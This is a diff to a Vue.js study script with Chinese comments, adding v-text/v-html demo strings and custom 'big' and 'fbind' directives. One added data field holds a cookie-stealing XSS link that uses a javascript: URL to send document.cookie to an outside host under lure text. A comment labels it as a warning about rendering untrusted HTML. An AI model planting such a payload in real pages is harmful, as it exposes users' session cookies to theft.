@@ -8,6 +8,12 @@ const v = new Vue({
     el: ".event",
     // data存储数据对象式写法，数据提供给el属性指定的容器服务，一旦Vue中data存储的数据变化el属性指定的容器中引用的地方也会变化
     data: {
+        h3Text:"<h3>v-text文本替换</h3>",
+        h3Html:"<h3>v-html文本替换</h3>",
+        // 注意不要出现这种html被解析，这样会导致用户的Cookie被盗走
+        xssa:"<a href=javascript:location.href='http://www.baidu.com?'+document.cookie>兄弟我找到你要的资源了，快来！</a>",
+        x:0,
+        m:1,
         name: "熔岩巨兽",
         url: "./img/熔岩巨兽.webp",
         xyx: "test",
@@ -67,6 +73,40 @@ const v = new Vue({
             //     console.log("按下回车才会打印输入的数据"+event.target.value);
             // }
             console.log(event.target.value)
+        }
+    },
+
+    // 自定义指令，这是局部指令，如果需要设置全局指令请参考全局过滤器
+    directives:{
+
+        // 注意这里的指令名称不是v-big而是big，但是在标签中使用时还是v-big，
+        // 如果标签需要的指令名称是v-bigName，请写成v-big-name，而函数名称请使用单引号写成'big-name'
+        // 注意第一个参数是使用v-big指令的标签虚拟DOM
+        // 第二个参数是一个对象，对象中的expression属性是v-big绑定的表达式，name是指令的简写名称，rawName是标签使用的指令名称
+        // 注意自定义指令函数中的this是window而不是Vm实例，如果需要使用请通过第二个参数获取
+        // 该函数在什么时候会被调用？1、自定义的指令与标签绑定成功时。2、指令所在模板被重新解析时
+        // 简写其实相当于bind和update都是该函数，但是inserted未写
+        big(element,binding){
+            element.innerText=binding.value*10
+        },
+
+
+        fbind:{
+
+            // 自定义的指令与标签绑定成功时，注意这个时候的element是虚拟DOM，这个时候不是真实DOM无法获取它的焦点
+            bind(element,binding){
+                element.value=binding.value
+            },
+            // 指令所在元素被插入页面时
+            inserted(element,binding){
+                element.focus()
+            },
+            // 指令所在模板被重新解析时调用
+            update(element,binding) {
+                element.value=binding.value
+                element.focus()
+            },
+
         }
     }
 
